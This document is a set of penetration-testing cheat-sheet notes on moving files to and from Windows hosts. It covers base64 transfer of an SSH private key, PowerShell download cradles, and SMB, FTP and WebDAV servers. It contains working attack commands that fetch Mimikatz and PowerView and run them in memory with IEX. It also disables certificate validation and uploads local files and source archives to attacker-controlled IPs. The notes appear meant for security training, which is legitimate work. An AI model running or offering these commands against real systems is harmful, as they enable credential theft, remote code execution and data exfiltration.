# Methods

## Windows

### Base64

An essential step in using this method is to ensure the file you encode and decode is correct. We can use [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html)

```bash
md5sum id_rsa
cat id_rsa |base64 -w 0;echo
```

copy and paste to terminal and decode

in windows:
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJT...0tLQo="))
```

confirm
```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

### Powershell Download

[System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`

```powershell
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# pipeline
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

alternative: wget, curl works too, but slower
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Harmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth gaining familiarity with them and their nuances, such as a lack of proxy awareness or touching disk (downloading a file onto the target) to select the appropriate one for the situation.

If error IE not available, use `-UseBasicParsing`
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

If SSL error,
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB

create server with username and password (if unauthenticated access blocked)
```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

mount & copyfile
```powershell
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP

set up server
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

transfer the file
```bash
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```


### Powershell Web Uploads

install server
```bash
pip3 install uploadserver
python3 -m uploadserver
# Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
```

upload file
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

or use base64 web upload
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

listen
```bash
nc -lvnp 8000
```




### SMB Uploads

Companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks

An alterative is to run `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

install
```bash
sudo pip3 install wsgidav cheroot

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

connect to share
```powershell
dir \\192.168.49.128\DavWWWRoot

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

### FTP Uploads
```
sudo python3 -m pyftpdlib --port 21 --write
```

```
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

## Linux